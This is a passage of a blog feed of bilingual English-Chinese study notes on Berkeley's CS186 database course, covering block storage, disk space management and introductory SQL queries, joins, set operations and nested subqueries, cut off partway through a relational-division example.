<h3 id="Block-Level-Storage"><a class="header-anchor" href="#Block-Level-Storage">¶</a>Block Level Storage</h3>
<ul>
<li>
<p><strong>块级存储</strong></p>
</li>
<li>
<p>Read and Write <strong>large chunks of sequential bytes</strong>   读写大顺序字节块：块级存储系统设计为一次读取或写入<strong>大的连续字节块</strong></p>
</li>
<li>
<p>Sequentially: “Next” disk block is fastest   顺序性：在顺序访问中，读取或写入“下一个”磁盘块是最快的</p>
</li>
<li>
<p>Maximize usage of data per Read/Write    最大化每次读写的数据使用量</p>
<ul>
<li>“Amortize” seek delays(HDDs) and writes (SSDs)   分摊   硬盘驱动器上的寻道延迟    以及旋转延迟    翻译器：通过<strong>分摊</strong>硬盘驱动器（HDD）上的寻道延迟和固态硬盘（SSD）上的写入放大，来提高效率</li>
</ul>
</li>
<li>
<p>Predict future behavior   预测未来行为</p>
<ul>
<li>Cache popular blocks   缓存热门块，将频繁访问的数据块存储在快速访问的缓存中</li>
<li>Pre-fetch likely-to-be-accessed blocks    预取可能访问的块，根据访问模式预测并提前加载数据块</li>
<li>Buffer writes to sequential blocks    缓冲顺序块的写入，将写入操作暂时存储，然后一次性写入到顺序的磁盘块中</li>
</ul>
</li>
</ul>
<h3 id="A-Note-on-Terminology"><a class="header-anchor" href="#A-Note-on-Terminology">¶</a>A Note on Terminology</h3>
<ul>
<li>术语解释</li>
<li>Block = Unit of transfer for disk read/write   <strong>块</strong>：磁盘读写操作的数据传输单元
<ul>
<li>64 KB - 128 KB is a good number today    64KB到128KB是一个常见的块大小</li>
<li>Book says 4 KB   书籍中可能提到4KB作为块大小的标准</li>
</ul>
</li>
<li>Page: a common synonym for “block”    <strong>页面</strong>：通常是“块”的同义词
<ul>
<li>In some texts, “page” = a block-sized chunk of RAM    在某些文献中，“页面”指的是RAM中与块大小相等的数据块</li>
</ul>
</li>
<li>treat “block” and “page” as synonyms     将“块”和“页面”视为可以互换的同义词</li>
</ul>
<h3 id="Arranging-Blocks-on-Disk"><a class="header-anchor" href="#Arranging-Blocks-on-Disk">¶</a>Arranging Blocks on Disk</h3>
<ul>
<li>
<p>在磁盘上排列块</p>
</li>
<li>
<p>‘Next’ block concept:</p>
<ul>
<li>sequential blocks on same track, followed by     位于同一磁道上的顺序块</li>
<li>blocks on same cylinder, followed by  位于同一柱面上的块</li>
<li>blocks on adjacent cylinder   相邻柱面上的块</li>
</ul>
</li>
<li>
<p>Arrange file pages sequentially by ‘next’ on disk     按磁盘上的“下一个”顺序排列文件页面</p>
<ul>
<li>minimize seek and rotational delay     最小化寻道和旋转延迟</li>
</ul>
</li>
<li>
<p>For a sequential scan, pre-fetch    对于顺序扫描，进行预取</p>
<ul>
<li>several blocks at a time    一次预取多个块</li>
</ul>
</li>
<li>
<p>Read large consecutive blocks     读取大的连续块</p>
</li>
</ul>
<h3 id="Disk-Space-Management"><a class="header-anchor" href="#Disk-Space-Management">¶</a>Disk Space Management</h3>
<ul>
<li>
<p>磁盘空间管理</p>
</li>
<li>
<p>Lowest layer of DBMS, manages space on disk</p>
</li>
<li>
<p>Purpose:</p>
<ul>
<li>Map pages to locations on disk    将页面映射到磁盘上的位置</li>
<li>Load pages from disk to memory   从磁盘加载页面到内存</li>
<li>Save pages back to disk &amp; ensuring writes    将页面保存回磁盘并确保写入</li>
</ul>
</li>
<li>
<p>Higher levels call upon this layer to :    更高层级调用这一层来：</p>
<ul>
<li>Read/write a page     读写页面</li>
<li>Allocate/de-allocate logical pages    分配/释放逻辑页面</li>
</ul>
</li>
</ul>
<h4 id="Requesting-Pages"><a class="header-anchor" href="#Requesting-Pages">¶</a>Requesting Pages</h4>
<ul>
<li>
<p>请求页面</p>
</li>
<li>
<p>Request for s sequences of pages best satisfied by pages stored sequentially on disk     对页面序列的请求最好由磁盘上顺序存储的页面满足</p>
<ul>
<li>Physical details hidden from higher levels of systems    物理细节对系统更高层级隐藏</li>
<li>Higher levels may “safely” assume Next Page is fast, so they will simply expect sequential runs of pages to be quick to scan   更高层级可能“安全地”假设下一页很快，因此他们将期望页面的顺序运行快速扫描</li>
<li>尼玛好抽象……</li>
</ul>
</li>
</ul>
<h4 id="Implementation"><a class="header-anchor" href="#Implementation">¶</a>Implementation</h4>
<ul>
<li>
<p>实现</p>
</li>
<li>
<p>Proposal 1：Talk to the storage device directly   数据库存储软件直接与存储设备对话，存储设备绕过操作系统的任何功能导出的协议</p>
<ul>
<li>could be very fast if u knew the device well   数据库系统直接连接到硬件，速度尽可能的快</li>
<li>when devices change    设备可能变换，所以这个proposal不适用了</li>
</ul>
</li>
<li>
<p>Proposal 2: Run over filesystems (FS)</p>
<ul>
<li>Allocate single large “contiguous” file on a nice empty disk and assume sequential / nearby byte access are fast     在一个干净的空磁盘上分配一个大的“连续”文件，并假设顺序/附近的字节访问是快速的</li>
<li>Most FS optimize disk layout for sequential access    大多数文件系统优化磁盘布局以进行顺序访问
<ul>
<li>Gives us more or less what we want if we start with an empty disk</li>
</ul>
</li>
<li>DBMS “file” may span multiple FS files on multiple disks/machines      DBMS的“文件”可能跨越多个磁盘/机器上的多个文件系统文件</li>
</ul>
</li>
</ul>
<h3 id="Summary-Disk-Space-Management"><a class="header-anchor" href="#Summary-Disk-Space-Management">¶</a>Summary: Disk Space Management</h3>
<ul>
<li>provide API to read and write pages to device    提供API以向设备读写页面</li>
<li>Pages: block level organization of bytes on disk    页面：磁盘上字节的块级组织</li>
<li>Provides “next” locality and abstracts FS/device details    提供“下一个”局部性并抽象文件系统/设备细节</li>
</ul>
<h2 id="Disks-and-Files-Summary"><a class="header-anchor" href="#Disks-and-Files-Summary">¶</a>Disks and Files: Summary</h2>
<ul>
<li>Magnetic (hard) disks and SSDs   磁性（硬）磁盘和固态硬盘（SSDs）
<ul>
<li>Basic HDD mechanics   基本的HDD机械特性</li>
<li>SSD write amplification    SSD写入放大</li>
<li>Concept of “near” pages and how it relates to cost of access   近邻页面的概念以及相对成本</li>
<li>Relative cost of
<ul>
<li>Random vs. sequential disk access (10x)    随机访问与顺序磁盘访问</li>
<li>Disk (pluto 冥王星) vs RAM (sacramento) vs. registers (your head)     磁盘（以冥王星为例）与RAM（以萨克拉门托为例？不懂）与寄存器（你的头脑）
<ul>
<li>Big differences</li>
<li>不同存储介质的成本和性能有显著差异，寄存器最快但容量最小，RAM容量较大且速度很快，而磁盘提供了巨大的存储容量但速度相对较慢</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>DB File storage
<ul>
<li>Typically over FS file(s)    通常通过文件系统（FS）上的一个或多个文件来实现</li>
</ul>
</li>
<li>Disk space manager loads and stores pages
<ul>
<li>Block level reasoning     基于块级逻辑进行操作</li>
<li>Abstracts device and file system; provide fast “next”     抽象化了设备和文件系统的细节；提供快速的“下一个”页面访问</li>
</ul>
</li>
</ul>
<h1>写在后面</h1>
<p>抽象啊（流口水</p>
<p>不过也算有所收获</p>
]]></content>
      <categories>
        <category>notes</category>
        <category>SQL notes</category>
      </categories>
      <tags>
        <tag>CS Notes</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>CS186 SQL2 Berkeley</title>
    <url>/project/2024/07/05/CS_Notes/Database/CS186%20SQL2/</url>
    <content><![CDATA[<h2 id="写在前面"><a class="header-anchor" href="#写在前面">¶</a>写在前面</h2>
<p>Berkeley CS186 Intro to DB Systems</p>
<p><a href="https://www.youtube.com/watch?v=Q-dxGaR3fH0&amp;list=PLYp4IGUhNFmw8USiYMJvCUjZe79fvyYge&amp;index=6">视频地址</a>  课程记录</p>
<h2 id="SQL-2"><a class="header-anchor" href="#SQL-2">¶</a>SQL 2</h2>
<h3 id="Conceptual-SQL-Evaluation"><a class="header-anchor" href="#Conceptual-SQL-Evaluation">¶</a>Conceptual SQL Evaluation</h3>
<p>SQL查询从原始数据表提取和转换数据的执行顺序</p>
<ol>
<li>
<p><code>FROM</code> Identify table  确定表</p>
</li>
<li>
<p><code>WHERE</code>  Apply selections(eliminate rows)   应用选择条件（筛选行）</p>
</li>
<li>
<p><code>SELECT</code>  Project away columns(keep only those used in SELECT, GBY, HAVING)   SELECT子句指定了需要返回哪些列，或通过聚合函数进行计算</p>
</li>
<li>
<p><code>GROUP BY</code>  Form groups &amp; aggregate   用GROUP BY将数据分组，并对每个组应用聚合函数</p>
</li>
<li>
<p><code>HAVING</code>  Eliminate groups   过滤不满足条件的组</p>
</li>
<li>
<p><code>DISTINCT</code>  Eliminate duplicates   在最终结果中去除重复的行</p>
</li>
<li>
<p>(Optinal) <code>ORDER BY</code> <code>LIMIT</code> applied at end, to “format” output  格式化输出    <code>ORDER BY</code> 用于控制升序/降序输出, <code>LIMIT</code> 用于获取特定数量的排序后结果，通常与<code>ORDER BY</code>一起使用</p>
</li>
</ol>
<h4 id="Putting-it-all-together"><a class="header-anchor" href="#Putting-it-all-together">¶</a>Putting it all together</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.dept, <span class="built_in">AVG</span>(S.gpa), <span class="built_in">COUNT</span>(<span class="operator">*</span>)</span><br><span class="line"><span class="keyword">FROM</span> Students S</span><br><span class="line"><span class="keyword">WHERE</span> S.gender <span class="operator">=</span> <span class="string">&#x27;F&#x27;</span></span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> S.dept</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="operator">&gt;=</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> S.dept</span><br></pre></td></tr></table></figure>
<p>解释：从别名为S的Students学生表中，筛选出性别为Female的学生，按照所在部门分组，并输出符合条件的学生的部门信息、平均GPA和学生总数，至少有两名女性学生的部门才会被输出，最终结果按照部门字典序排列</p>
<h3 id="Join-Queries"><a class="header-anchor" href="#Join-Queries">¶</a>Join Queries</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> [<span class="keyword">DISTINCT</span>] <span class="operator">&lt;</span><span class="keyword">column</span> expression list<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">FROM</span> <span class="operator">&lt;</span>table1 [<span class="keyword">AS</span> t1], ..., tableN [<span class="keyword">AS</span> tn]<span class="operator">&gt;</span></span><br><span class="line">[<span class="keyword">WHERE</span> <span class="operator">&lt;</span>predicate<span class="operator">&gt;</span>]</span><br><span class="line">[<span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">&lt;</span><span class="keyword">column</span> list<span class="operator">&gt;</span> [<span class="keyword">HAVING</span>  <span class="operator">&lt;</span>predicate<span class="operator">&gt;</span>] ]</span><br><span class="line">[<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="operator">&lt;</span><span class="keyword">column</span> list<span class="operator">&gt;</span>];</span><br></pre></td></tr></table></figure>
<p><code>多表查询</code></p>
<p>区别就是FROM那里有多个表</p>
<h4 id="Cross-Cartesian-Product"><a class="header-anchor" href="#Cross-Cartesian-Product">¶</a>Cross(Cartesian) Product</h4>
<ul>
<li>All pairs of tuples, concentrated</li>
</ul>
<h4 id="Example-Sailors-who-have-reserved-a-boat"><a class="header-anchor" href="#Example-Sailors-who-have-reserved-a-boat">¶</a>Example: Sailors who have reserved a boat</h4>
<p><code>Sailors</code>表</p>
<table>
<thead>
<tr>
<th>sid</th>
<th>sname</th>
<th>rating</th>
<th>age</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Popeye</td>
<td>10</td>
<td>22</td>
</tr>
<tr>
<td>2</td>
<td>OliveOyl</td>
<td>11</td>
<td>39</td>
</tr>
<tr>
<td>3</td>
<td>Garfield</td>
<td>1</td>
<td>27</td>
</tr>
<tr>
<td>4</td>
<td>Bob</td>
<td>5</td>
<td>19</td>
</tr>
</tbody>
</table>
<p><code>Reserveds</code> 表</p>
<table>
<thead>
<tr>
<th>SID</th>
<th>BID</th>
<th>DAY</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>102</td>
<td>9//12</td>
</tr>
<tr>
<td>2</td>
<td>102</td>
<td>9/13</td>
</tr>
<tr>
<td>1</td>
<td>101</td>
<td>10/01</td>
</tr>
</tbody>
</table>
<p>有效合并表的SQL语句 “预订了船的水手”</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sailors.sid, Sailors.sname, Reserves.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors, Reserves</span><br><span class="line"><span class="keyword">WHERE</span> Sailors.sid <span class="operator">=</span> Reserves.sid</span><br></pre></td></tr></table></figure>
<p>合并后的表—— “预订了船的水手”</p>
<table>
<thead>
<tr>
<th>sid</th>
<th>BID</th>
<th>day</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>102</td>
<td>9/12</td>
</tr>
<tr>
<td>2</td>
<td>102</td>
<td>9/13</td>
</tr>
<tr>
<td>1</td>
<td>101</td>
<td>10/01</td>
</tr>
</tbody>
</table>
<h3 id="Column-Names-and-Table-Aliases"><a class="header-anchor" href="#Column-Names-and-Table-Aliases">¶</a>Column Names and Table Aliases</h3>
<p>原来的：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sailors.sid, Sailors.sname, Reserve.bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors, Reserves</span><br><span class="line"><span class="keyword">WHERE</span> Sailors.sid <span class="operator">=</span> Reserve.sid</span><br></pre></td></tr></table></figure>
<p>改进之后：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> Sailors.sid, sname, bid</span><br><span class="line"><span class="keyword">FROM</span> Sailors <span class="keyword">AS</span> S, Reserves <span class="keyword">AS</span> R</span><br><span class="line"><span class="keyword">WHERE</span> S.sid <span class="operator">=</span> R.sid</span><br></pre></td></tr></table></figure>
<p>因为<code>sname</code>只有<code>Sailors</code>里面有，<code>bid</code>只有<code>Reserves</code>里面有，所以可以省略前缀，但是<code>sid</code>是两个表都有，所以需要加前缀来区分是哪个表的</p>
<p>然后给表名取别名，有助于代码精简+可读性↑</p>
<h4 id="More-Aliases"><a class="header-anchor" href="#More-Aliases">¶</a>More Aliases</h4>
<p>别名也可以在输出中使用</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> x.sname, x.age, y.sname <span class="keyword">AS</span> sname2, y.age <span class="keyword">AS</span> age2</span><br><span class="line"><span class="keyword">FROM</span> Sailors <span class="keyword">AS</span> x, Sailors <span class="keyword">AS</span> y</span><br><span class="line"><span class="keyword">WHERE</span> x.age <span class="operator">&gt;</span> y.age</span><br></pre></td></tr></table></figure>
<p>给同一个表两个别名，把一个表分成两个表，其中左表的年龄比右表大</p>
<ul>
<li>Table aliases in the FROM clause   - Needed when the same table used multiple times (“self-join”)    当同一个表被多次使用（“自连接”）的时候需要使用表别名来区分</li>
<li>Column aliases in the SELECT clause  为列指定别名，以便在查询结果中使用更有意义的列名</li>
</ul>
<h3 id="Arithmetic-Expressions"><a class="header-anchor" href="#Arithmetic-Expressions">¶</a>Arithmetic Expressions</h3>
<p>可以在``SELECT`语句中指定算术运算符和表达式</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.age, S.age <span class="operator">-</span> <span class="number">5</span> <span class="keyword">AS</span> age1, <span class="number">2</span> <span class="operator">*</span> S.ages <span class="keyword">AS</span> age2</span><br><span class="line"><span class="keyword">FROM</span> Sailors <span class="keyword">AS</span> S</span><br><span class="line"><span class="keyword">WHERE</span> S.sname <span class="operator">=</span> <span class="string">&#x27;Popeye&#x27;</span></span><br></pre></td></tr></table></figure>
<p>在``WHERE`语句中也可以使用算术运算符和表达式</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S1.sname <span class="keyword">AS</span> name1, S2.sname <span class="keyword">AS</span> name2</span><br><span class="line"><span class="keyword">FROM</span> Sailors <span class="keyword">AS</span> S1, Sailors <span class="keyword">AS</span> S2</span><br><span class="line"><span class="keyword">WHERE</span> <span class="number">2</span><span class="operator">*</span>S1.rating <span class="operator">=</span> S2.rating<span class="number">-1</span></span><br></pre></td></tr></table></figure>
<h3 id="SQL-Calculator"><a class="header-anchor" href="#SQL-Calculator">¶</a>SQL Calculator!</h3>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">	<span class="built_in">log</span>(<span class="number">1000</span>) <span class="keyword">as</span> three,</span><br><span class="line">	<span class="built_in">exp</span>(<span class="built_in">ln</span>(<span class="number">2</span>)) <span class="keyword">as</span> two,</span><br><span class="line">	<span class="built_in">cos</span>(<span class="number">0</span>) <span class="keyword">as</span> <span class="keyword">one</span>,</span><br><span class="line">	<span class="built_in">ln</span>(<span class="number">2</span><span class="operator">*</span><span class="number">3</span>) <span class="operator">=</span> <span class="built_in">ln</span>(<span class="number">2</span>) <span class="operator">+</span> <span class="built_in">ln</span>(<span class="number">3</span>) <span class="keyword">as</span> sanity;</span><br></pre></td></tr></table></figure>
<p>没有FROM语句，且只返回一行。也可以吧SQL语言当作计算器</p>
<p>以上语句会输出一行四列的表</p>
<h3 id="String-Comparisons"><a class="header-anchor" href="#String-Comparisons">¶</a>String Comparisons</h3>
<p>SQL还支持字符串函数，特别是WHERE子句中的字符串比较函数，以下是两种不同的方式来查找格式为以B开头、且有任意数量其他字符的字符串：</p>
<ul>
<li>Old-school SQL</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.sname <span class="keyword">like</span> <span class="string">&#x27;B_%&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Standard Regular Expressions</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.sname <span class="operator">~</span> <span class="string">&#x27;B.*&#x27;</span></span><br></pre></td></tr></table></figure>
<p>好像用的是正则表达式   ~代表的是正则式匹配</p>
<h3 id="Combining-Predicates"><a class="header-anchor" href="#Combining-Predicates">¶</a>Combining Predicates</h3>
<p>使用布尔逻辑来组合多个谓词</p>
<ul>
<li>Subtle connections between:
<ul>
<li>Boolean logic in WHERE(i.e., AND, OR)</li>
<li>Traditional Set operations(i.e., INTERSECT, UNION)  传统集合操作</li>
</ul>
</li>
</ul>
<h4 id="Example1-Sid’s-of-sailors-who-reserved-a-red-or-green-boat"><a class="header-anchor" href="#Example1-Sid’s-of-sailors-who-reserved-a-red-or-green-boat">¶</a>Example1: Sid’s of sailors who reserved a red or green boat</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> (B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span> <span class="keyword">OR</span> B.color <span class="operator">=</span> <span class="string">&#x27;green&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>另一种方式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;green&#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>UNION ALL</code>    不移除重复项，相当于取并集，红or绿</p>
<h4 id="Example2-Sid’s-of-sailors-who-reserved-a-red-and-green-boat"><a class="header-anchor" href="#Example2-Sid’s-of-sailors-who-reserved-a-red-and-green-boat">¶</a>Example2: Sid’s of sailors who reserved a red and green boat</h4>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> (B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span> <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;green&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>但是此处第一种方式将不会返回任何东西，因为<code>color</code>不可能同时<code>='red'</code> 且<code>='green'</code></p>
<p>所以此处只能使用另一种方式：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;red&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">INTERSECT</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> R.sid</span><br><span class="line"><span class="keyword">FROM</span> Boats B, Reserves R</span><br><span class="line"><span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid <span class="keyword">AND</span> B.color <span class="operator">=</span> <span class="string">&#x27;green&#x27;</span></span><br></pre></td></tr></table></figure>
<p><code>INTERSECT</code>   相当于取交集，红and绿</p>
<h3 id="Set-Semantics"><a class="header-anchor" href="#Set-Semantics">¶</a>Set Semantics</h3>
<ul>
<li>Set: a collection of distinct elements    集合是由不同元素组成的集合</li>
<li>Standard ways of manipulating / combining sets
<ul>
<li>Union  并集</li>
<li>Intersect   交集</li>
<li>Except   差集</li>
</ul>
</li>
<li>Treat tuples within a relation as elements of a set   将关系中的元组视为集合中的元素</li>
</ul>
<h4 id="Default-Set-Semantics"><a class="header-anchor" href="#Default-Set-Semantics">¶</a>Default: Set Semantics</h4>
<p><code>R = &#123;A, A, A, A, B, B, C, D&#125;</code></p>
<p><code>S = &#123;A, A, B, B, B, C, E&#125;</code></p>
<ul>
<li><code>UNION &#123;A, B, C, D, E&#125;</code></li>
<li><code>INTERSECT &#123;A, B, C&#125;</code></li>
<li><code>EXCEPT &#123;D&#125;</code></li>
</ul>
<p>Note: Think of each other as being a tuple in relation</p>
<h4 id="“ALL”-Multiset-Semantics"><a class="header-anchor" href="#“ALL”-Multiset-Semantics">¶</a>“ALL”: Multiset Semantics</h4>
<p><code>R = &#123;A, A, A, A, B, B, C, D&#125; = &#123;A(4), B(2), C(1), D(1)&#125;</code></p>
<p><code>S = &#123;A, A, B, B, B, C, E&#125; = &#123;A(2), B(3), C(1), E(1)&#125;</code></p>
<ul>
<li><code>UNION ALL: sum of cardinalities</code>    <code>&#123;A(4+2), B(2+3), C(1+1), D(1+0), E(0+1)&#125; = &#123;A, A, A, A, A, A, B, B, B, B, B, C, C, D, E&#125;</code></li>
<li><code>INTERSECT ALL: min of cardinalities</code>   <code>&#123;A(min(4, 2)), B(min(2, 3)), C(min(1, 1)), D(min(1, 0)), E(min(0, 1))&#125; = &#123;A, A, B, B, C&#125;</code></li>
<li><code>EXCEPT ALL: difference of cardinalities</code>   <code>&#123;A(4-2), B(2-3), C(1-1), D(1-0), E(0-1)&#125; = &#123;A, A, D&#125;</code></li>
</ul>
<h3 id="Nested-Queries"><a class="header-anchor" href="#Nested-Queries">¶</a>Nested Queries</h3>
<ul>
<li><code>嵌套查找</code></li>
</ul>
<h4 id="Nested-Queries-IN"><a class="header-anchor" href="#Nested-Queries-IN">¶</a>Nested Queries: IN</h4>
<ul>
<li>Example: Names of sailors who’ve reserved boat #102:</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.sid <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> R.sid</span><br><span class="line">     <span class="keyword">FROM</span> Reserves R</span><br><span class="line">    <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> <span class="number">102</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>括号里的是<code>subquery</code></li>
</ul>
<h4 id="Nested-Queries-NOT-IN"><a class="header-anchor" href="#Nested-Queries-NOT-IN">¶</a>Nested Queries: NOT IN</h4>
<ul>
<li>Example: Names of sailors who’ve not reserved boat #103:</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.sid <span class="keyword">NOT</span> <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> R.sid</span><br><span class="line">     <span class="keyword">FROM</span> Reserves R</span><br><span class="line">    <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> <span class="number">103</span>)</span><br></pre></td></tr></table></figure>
<h4 id="Nested-Queries-EXISTS"><a class="header-anchor" href="#Nested-Queries-EXISTS">¶</a>Nested Queries: EXISTS</h4>
<ul>
<li>This is a bit odd, but it is legal:</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span></span><br><span class="line">	(<span class="keyword">SELECT</span> R.sid</span><br><span class="line">    <span class="keyword">FROM</span> Reserves R</span><br><span class="line">    <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> <span class="number">103</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>如果subquery有东西返回，就输出其中所有的sname，如果subquery返回为空，则query输出也为空</li>
</ul>
<h4 id="Nested-Queries-with-Correlation"><a class="header-anchor" href="#Nested-Queries-with-Correlation">¶</a>Nested Queries with Correlation</h4>
<ul>
<li>相关子查询</li>
<li>Names of sailors who 've reserved boat #102:</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span></span><br><span class="line">	(<span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">    <span class="keyword">FROM</span> Reserves R</span><br><span class="line">    <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> <span class="number">102</span> <span class="keyword">AND</span> S.sid <span class="operator">=</span> R.sid)</span><br></pre></td></tr></table></figure>
<ul>
<li>Correlated subquery is recomputed for each Sailors tuple   相关子查询针对每个Sailors元组（元组代表表中的一行 记录）重新计算</li>
<li>这个相关子查询有点像函数</li>
</ul>
<h4 id="More-on-Set-Comparison-Operators"><a class="header-anchor" href="#More-on-Set-Comparison-Operators">¶</a>More on Set-Comparison Operators</h4>
<ul>
<li>We 've seen: <code>IN</code>  <code>EXISTS</code></li>
<li>Can also have: <code>NOT</code>  <code>IN</code>  <code>NOT EXISTS</code></li>
<li>Other forms: <code>op ANY</code>  <code>op ALL</code></li>
</ul>
<h5 id="Example-Find-sailors-whose-rating-is-greater-than-that-of-some-sailor-called-Popeye"><a class="header-anchor" href="#Example-Find-sailors-whose-rating-is-greater-than-that-of-some-sailor-called-Popeye">¶</a>Example: Find sailors whose rating is greater than that of some sailor called Popeye</h5>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> S.rating <span class="operator">&gt;</span> <span class="keyword">ANY</span></span><br><span class="line">	(<span class="keyword">SELECT</span> S2.rating</span><br><span class="line">    <span class="keyword">FROM</span> Sailors S2</span><br><span class="line">    <span class="keyword">WHERE</span> S2.sname <span class="operator">=</span> <span class="string">&#x27;Popeye&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>从Sailors表中，找出比Popeye的rating更高的人，输出其所有信息</li>
</ul>
<h3 id="A-Tough-One-“Division”——Relational-Division"><a class="header-anchor" href="#A-Tough-One-“Division”——Relational-Division">¶</a>A Tough One: “Division”——Relational Division</h3>
<ul>
<li>Relational Division: “Find sailors who 've reserved all boats.”     Said differently: “sailors with no counterexample missing boats”      关系除法：“找出预订了所有船只的水手。”      以下有点像双重否定之后输出了正确的结果</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> S.sname</span><br><span class="line"><span class="keyword">FROM</span> Sailors S</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span></span><br><span class="line">	(<span class="keyword">SELECT</span> B.bid</span><br><span class="line">    <span class="keyword">FROM</span> Boats B</span><br><span class="line">    <span class="keyword">WHERE</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> (<span class="keyword">SELECT</span> R.bid</span><br><span class="line">                     <span class="keyword">FROM</span> Reserves R</span><br><span class="line">                     <span class="keyword">WHERE</span> R.bid <span class="operator">=</span> B.bid</span><br><span class="line">                     <span 